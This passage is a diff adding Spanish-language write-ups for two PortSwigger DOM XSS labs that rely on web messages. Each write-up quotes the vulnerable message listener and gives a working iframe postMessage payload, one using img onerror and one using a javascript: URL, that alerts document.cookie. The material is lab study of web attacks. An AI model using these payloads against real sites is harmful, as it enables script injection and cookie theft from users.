@@ -406,6 +406,47 @@ javascript:alert("1337")
 
 ## [DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based)
 
+### [DOM XSS using web messages](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages)
+
+En este laboratorio el sitio vulnerable tiene un event listener `message` con el siguiente código, el cual carga todo el contenido del mensaje en un `div` con id `ads`:
+
+```
+<script>
+    window.addEventListener('message', function(e) {
+        document.getElementById('ads').innerHTML = e.data;
+    })
+</script>
+```
+
+Para resolver el laboratorio, se debe cargar en el exploit server un `iframe`, que al ser cargado envía un web message a la home del sitio vulnerable. El event listener inserta el contenido (es decir, una imagen) en `ads`. Como la imagen tiene un `src` inválido, se ejecuta el handler `onerror`, que muestra las cookies.
+
+```
+<iframe src="https://id-del-laboratorio.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=alert(document.cookie)>','*')">
+```
+
+### [DOM XSS using web messages and a JavaScript URL](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url)
+
+La home del sitio vulnerable tiene el siguiente event listener, que evalúa si en cualquier parte (no sólo al comienzo) del mensaje está el substring `"http:"` o `"https:"`. En caso afirmativo, lo guarda en `location.href`
+
+```
+<script>
+    window.addEventListener('message', function(e) {
+        var url = e.data;
+        if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
+            location.href = url;
+        }
+    }, false);
+</script>
+```
+
+Para resolver el laboratorio se carga en el exploit server un `iframe` que envíe un mensaje que alerte las cookies mediante Javascript, pero al final del mismo se agrega un comentario y la palabra `http:`. Esto hará que se cumpla la condición del event listener, y al mismo tiempo no dará ningún error de sintaxis.
+
+```
+<iframe src="https://id-del-laboratorio.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:alert(document.cookie)//http:','*')">
+```
+
+### []()
+
 ---
 
 ## [Cross-origin resource sharing (CORS)](https://portswigger.net/web-security/cors)
